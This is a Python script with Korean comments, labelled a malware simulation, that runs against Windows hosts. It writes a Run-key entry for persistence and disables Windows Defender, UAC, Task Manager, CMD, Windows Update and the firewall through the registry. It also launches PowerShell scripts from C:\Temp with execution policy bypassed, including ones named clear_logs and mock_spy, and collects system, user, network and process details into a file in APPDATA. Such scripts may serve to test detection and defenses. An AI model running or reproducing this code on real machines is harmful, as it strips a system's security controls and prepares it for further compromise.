import os
import subprocess
import platform
import datetime
import winreg

def registry_operations():
    """10가지 이상의 레지스트리 생성 및 변조를 수행합니다."""
    print("레지스트리 작업을 수행합니다...")
    try:
        # 1. 지속성 확보: Run 키에 스크립트 등록
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MalwareSimulation", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(key)

        # 2. 윈도우 디펜더 비활성화
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # 3. UAC 비활성화
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        
        # 4. 작업 관리자 비활성화
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        if not key:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

        # 5. CMD 비활성화
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_SET_VALUE)
        if not key:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

        # 6. Windows Update 비활성화
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", 0, winreg.KEY_SET_VALUE)
        if not key:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU")
        winreg.SetValueEx(key, "NoAutoUpdate", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

        # 7. 네트워크 위치 변경 (공용 -> 개인)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles", 0)
        for i in range(100):
            try:
                profile_guid = winreg.EnumKey(key, i)
                profile_key = winreg.OpenKey(key, profile_guid, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(profile_key, "Category", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(profile_key)
            except OSError:
                break
        winreg.CloseKey(key)

        # 8. 방화벽 비활성화 (표준 프로필)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "EnableFirewall", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)

        # 9. 사용자 계정 컨트롤 알림 수준 최저로 설정
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)

        # 10. 스크립트 파일 숨김 속성 부여
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)

        print("레지스트리 작업 완료.")
    except Exception as e:
        print(f"레지스트리 작업 실패: {e}")

def execute_powershell_scripts():
    """5가지 파워쉘 스크립트를 실행합니다."""
    print("파워쉘 스크립트를 실행합니다...")
    
    # 파워쉘 스크립트 파일 경로를 지정 (C:\Temp 폴더에 있다고 가정)
    ps_scripts = [
        r"C:\Temp\info.ps1",
        r"C:\Temp\user_process.ps1",
        r"C:\Temp\firewall_change.ps1",
        r"C:\Temp\clear_logs.ps1",
        r"C:\Temp\mock_spy.ps1"
    ]
    
    for script in ps_scripts:
        if os.path.exists(script):
            try:
                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script], check=True)
                print(f"스크립트 실행 완료: {os.path.basename(script)}")
            except subprocess.CalledProcessError as e:
                print(f"스크립트 실행 실패 {os.path.basename(script)}: {e}")
            except FileNotFoundError:
                print(f"powershell.exe를 찾을 수 없습니다.")
        else:
            print(f"스크립트 파일을 찾을 수 없습니다: {script}")

def gather_information():
    """CMD를 사용해 5가지 정보를 수집하고 텍스트 파일로 저장합니다."""
    print("정보를 수집하고 저장합니다...")
    
    log_file_path = os.path.join(os.environ["APPDATA"], "collected_info.txt")
    
    with open(log_file_path, "a", encoding="utf-8") as f:
        f.write(f"--- 정보 수집 시간: {datetime.datetime.now()} ---\n\n")

        # 1. 시스템 정보
        f.write("--- [시스템 정보] ---\n")
        subprocess.run("systeminfo", shell=True, stdout=f, stderr=f)
        f.write("\n\n")

        # 2. 사용자 및 그룹 정보
        f.write("--- [사용자 및 그룹 정보] ---\n")
        subprocess.run("whoami", shell=True, stdout=f, stderr=f)
        f.write("\n")
        subprocess.run("net user", shell=True, stdout=f, stderr=f)
        f.write("\n\n")

        # 3. 네트워크 정보
        f.write("--- [네트워크 정보] ---\n")
        subprocess.run("ipconfig /all", shell=True, stdout=f, stderr=f)
        f.write("\n\n")

        # 4. 활성 네트워크 연결 정보
        f.write("--- [네트워크 연결] ---\n")
        subprocess.run("netstat -ano", shell=True, stdout=f, stderr=f)
        f.write("\n\n")
        
        # 5. 실행 중인 프로세스 목록
        f.write("--- [프로세스 목록] ---\n")
        subprocess.run("tasklist /v", shell=True, stdout=f, stderr=f)
        f.write("\n\n")

    print(f"정보가 '{log_file_path}'에 저장되었습니다.")

if __name__ == "__main__":
    if platform.system() == "Windows":
        registry_operations()
        execute_powershell_scripts()
        gather_information()
        print("모든 작업이 완료되었습니다.")
    else:
        print("이 스크립트는 Windows 운영체제에서만 실행됩니다.")